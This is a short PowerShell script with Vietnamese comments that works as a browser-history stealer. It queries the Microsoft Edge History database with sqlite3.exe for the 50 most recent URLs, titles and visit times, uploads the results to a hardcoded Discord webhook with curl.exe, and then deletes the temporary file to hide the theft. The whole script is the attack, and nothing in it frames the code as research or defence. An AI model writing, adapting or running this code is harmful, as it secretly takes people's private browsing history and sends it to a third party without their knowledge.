param(
    [string]$sqlitePath = "$env:TEMP\sqlite\sqlite3.exe"
)

# Webhook Discord của bạn
$dc = "1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
$whuri = "$dc"
if ($whuri.Length -lt 120){
    $whuri = ("https://discord.com/api/webhooks/" + "$dc")
}

# Đường dẫn file tạm để lưu kết quả
$outpath = "$env:TEMP\edge_history.txt"

# Đường dẫn file History của Edge
$edgeHistory = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"

if (Test-Path $edgeHistory -and (Test-Path $sqlitePath)) {
    # Query bằng sqlite3.exe, lấy 50 dòng gần nhất
    & $sqlitePath $edgeHistory "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50;" | Out-File -FilePath $outpath -Encoding UTF8
} else {
    "Không tìm thấy file lịch sử Edge hoặc sqlite3.exe." | Out-File -FilePath $outpath -Encoding UTF8
}

# Gửi file lên Discord
curl.exe -F file1=@"$outpath" $whuri | Out-Null
Start-Sleep -Seconds 2
Remove-Item -Path $outpath -Force
